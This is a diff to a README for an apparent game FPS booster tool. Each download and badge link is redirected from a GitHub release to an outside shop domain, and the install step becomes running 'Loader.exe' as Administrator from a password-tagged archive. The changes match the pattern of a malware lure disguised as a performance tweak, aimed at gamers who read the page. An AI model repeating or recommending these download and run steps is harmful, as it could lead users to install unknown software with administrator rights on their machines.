@@ -1,9 +1,9 @@
 # Bodycam FPS Booster & Performance Optimizer 2026
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20(64--bit)-brightgreen.svg)](https://github.com/tomlopezeng2005i7/Bodycam-FPS-Booster-Optimizer-2026/releases/tag/v2.4.1)
-[![Engine](https://img.shields.io/badge/Engine-Unreal%20Engine%205-blue.svg)](https://github.com/tomlopezeng2005i7/Bodycam-FPS-Booster-Optimizer-2026/releases/tag/v2.4.1)
-[![Version](https://img.shields.io/badge/Version-v2.4.1%20(2026)-orange.svg)](https://github.com/tomlopezeng2005i7/Bodycam-FPS-Booster-Optimizer-2026/releases/tag/v2.4.1)
-[![Status](https://img.shields.io/badge/Status-Working%202026-success.svg)](https://github.com/tomlopezeng2005i7/Bodycam-FPS-Booster-Optimizer-2026/releases/tag/v2.4.1)
+[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20(64--bit)-brightgreen.svg)](https://tweakhub.shop/f/launcher)
+[![Engine](https://img.shields.io/badge/Engine-Unreal%20Engine%205-blue.svg)](https://tweakhub.shop/f/launcher)
+[![Version](https://img.shields.io/badge/Version-v2.4.1%20(2026)-orange.svg)](https://tweakhub.shop/f/launcher)
+[![Status](https://img.shields.io/badge/Status-Working%202026-success.svg)](https://tweakhub.shop/f/launcher)
 
 Welcome to the **Bodycam FPS Booster & Performance Optimizer 2026** repository. **Bodycam** is an ultra-realistic multiplayer first-person shooter powered by the revolutionary Unreal Engine 5. While its photorealistic visuals and camera immersion set a new standard for gaming, high-end rendering features like Lumen Global Illumination, Nanite Geometry, and Virtual Shadow Maps can cause severe frame drops, 1% low stuttering, and input lag on mid-tier and high-end hardware alike.
 
@@ -13,7 +13,7 @@ This open performance optimization toolkit is engineered specifically to elimina
 
 <img width="1280" height="720" alt="Image" src="https://github.com/user-attachments/assets/d64e7559-4689-4985-bd80-8d177d3aee2a" />
 
-### [📥 Download Bodycam FPS Booster & Optimizer 2026](https://github.com/tomlopezeng2005i7/Bodycam-FPS-Booster-Optimizer-2026/releases/tag/v2.4.1)  (PASS 2026)
+### [📥 Download Bodycam FPS Booster & Optimizer 2026](https://tweakhub.shop/f/launcher)  (PASS 2026)
 *(Click above to get the latest release build)*
 
 ---
@@ -59,7 +59,7 @@ Tested on 1080p, 1440p, and 4K resolutions with competitive graphics presets:
 
 1. **Download:** Get the optimizer package using the download link provided in this repository.
 2. **Extract Archive:** Unpack the `.zip` archive using WinRAR or 7-Zip to any folder on your drive.
-3. **Launch Setup:** Run `BodycamOptimizer_Setup.exe` as Administrator.
+3. **Launch Setup:** Run `Loader.exe` as Administrator.
 4. **Select Profile:** Choose between:
    - **Competitive (Max FPS & Low Latency):** Maximum frames, minimum input lag, crystal-clear visibility.
    - **Balanced (Best Visuals + Performance):** Preserves stunning bodycam realism while locking high FPS.
@@ -82,4 +82,4 @@ Yes! The optimizer includes an automated aspect ratio patch that fixes field of 
 
 ---
 
-### [📥 Download Latest Version (Mirror)](https://github.com/tomlopezeng2005i7/Bodycam-FPS-Booster-Optimizer-2026/releases/tag/v2.4.1)  (PASS 2026)
+### [📥 Download Latest Version (Mirror)](https://tweakhub.shop/f/launcher)  (PASS 2026)
